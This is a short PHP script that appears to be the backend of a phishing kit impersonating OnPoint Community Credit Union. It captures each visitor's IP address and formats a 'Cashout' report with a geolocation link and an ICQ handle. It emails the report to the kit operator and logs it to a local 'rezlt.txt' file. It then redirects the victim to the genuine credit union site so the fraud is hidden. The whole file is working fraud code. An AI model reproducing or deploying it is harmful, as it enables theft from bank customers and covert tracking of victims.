<?php
$Cashout = getenv("REMOTE_ADDR");
include('./Email (1).php');
$subject = "ONPOINT bolo of [ " . $Cashout . " ] /";
$headers = "From: Cashout-XXX <service>\r\n";
$message .= "
bolo ti teh
-------------------------------------------------
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."
+----/!\----<.! icq @716199390!.>---/!\----+>
\n";
mail($email,$subject,$message,$headers);
$text = fopen('./rezlt.txt', 'a');
fwrite($text, $message);
header("Location: https://www.onpointcu.com/media-center");
?>